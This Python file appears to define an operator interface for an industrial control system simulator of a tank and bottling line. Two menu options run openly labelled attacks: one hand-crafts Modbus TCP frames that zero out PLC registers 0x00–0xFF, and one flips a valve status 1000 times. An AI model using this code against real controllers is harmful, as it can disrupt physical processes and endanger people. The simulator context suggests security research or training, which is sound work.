import logging
import os
import sys
import time
import socket
import struct

from ics_sim.Device import HMI
from Configs import TAG, Controllers


class HMI2(HMI):
    def __init__(self):
        super().__init__('HMI2', TAG.TAG_LIST, Controllers.PLCs)

    def _display(self):
        menu = '\n'
        menu += self.__menu_line(1, 'empty level of tank')
        menu += self.__menu_line(2, 'full level of tank')
        menu += self.__menu_line(3, 'full level of bottle')
        menu += self.__menu_line(4, 'status of tank Input valve')
        menu += self.__menu_line(5, 'status of tank output valve')
        menu += self.__menu_line(6, 'status of conveyor belt engine')
        menu += self.__menu_line(7, 'execute Brute Force I/O attack (case 1)')
        menu += self.__menu_line(8, 'execute Brute Force I/O attack (case 2)')
        self.report(menu)

    def __menu_line(self, number, text):
        return '{} To change the {} press {} \n'.format(
            self._make_text(f'{number})', self.COLOR_BLUE),
            self._make_text(text, self.COLOR_GREEN),
            self._make_text(str(number), self.COLOR_BLUE)
        )

    def _operate(self):
        try:
            input1, input2 = self.__get_choice()

            if input1 == 7:
                self._attack_case1()
                return
            elif input1 == 8:
                self._attack_case2()
                return

            # Original behavior
            if input1 == 1:
                self._send(TAG.TAG_TANK_LEVEL_MIN, input2)
            elif input1 == 2:
                self._send(TAG.TAG_TANK_LEVEL_MAX, input2)
            elif input1 == 3:
                self._send(TAG.TAG_BOTTLE_LEVEL_MAX, input2)
            elif input1 == 4:
                self._send(TAG.TAG_TANK_INPUT_VALVE_MODE, input2)
            elif input1 == 5:
                self._send(TAG.TAG_TANK_OUTPUT_VALVE_MODE, input2)
            elif input1 == 6:
                self._send(TAG.TAG_CONVEYOR_BELT_ENGINE_MODE, input2)

        except ValueError as e:
            self.report(str(e))
        except Exception as e:
            self.report('The input is invalid: ' + str(e))

        input('press enter to continue ...')

    def __get_choice(self):
        input1 = int(input('your choice (1 to 8): '))
        if input1 < 1 or input1 > 8:
            raise ValueError('just integer values between 1 and 8 are acceptable')

        # default for attack cases (7,8)
        input2 = None

        if input1 <= 3:
            input2 = float(input('Specify set point (positive real value): '))
            if input2 < 0:
                raise ValueError('Negative numbers are not acceptable.')
        elif input1 <= 6:
            sub_menu = (
                '\n1) Send command for manually off\n'
                '2) Send command for manually on\n'
                '3) Send command for auto operation\n'
            )
            self.report(sub_menu)
            input2 = int(input('Command (1 to 3): '))
            if input2 < 1 or input2 > 3:
                raise ValueError('Just 1, 2, and 3 are acceptable for command')

        return input1, input2

    def _attack_case1(self):
        # Raw Modbus TCP brute force: write 0 to registers 0x00-0xFF
        plc1 = Controllers.PLCs.get(1)
        ip = plc1['ip']
        port = plc1['port']
        self.report(
            "Starting Brute Force I/O attack - Case 1: Writing registers 0x00 through 0xFF to zero via raw Modbus TCP."
        )
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ip, port))

        transaction_id = 0
        unit_id = 1  # PLC unit ID
        function_code = 6  # Write single register

        for reg in range(0x00, 0x100):
            transaction_id = (transaction_id + 1) % 0x10000
            frame = struct.pack(
                '>HHHBBHH',
                transaction_id, 0, 6,
                unit_id, function_code,
                reg, 0
            )
            try:
                sock.sendall(frame)
                sock.recv(12)
            except Exception:
                pass
            time.sleep(0.1)

        sock.close()

    def _attack_case2(self):
        self.report(
            "Starting Brute Force I/O attack - Case 2: Flipping TANK_INPUT_VALVE_STATUS 1000×."
        )
        for _ in range(1000):
            self._send(TAG.TAG_TANK_INPUT_VALVE_STATUS, 1)
            time.sleep(0.1)
            self._send(TAG.TAG_TANK_INPUT_VALVE_STATUS, 0)
            time.sleep(0.1)


if __name__ == '__main__':
    hmi2 = HMI2()
    hmi2.start()
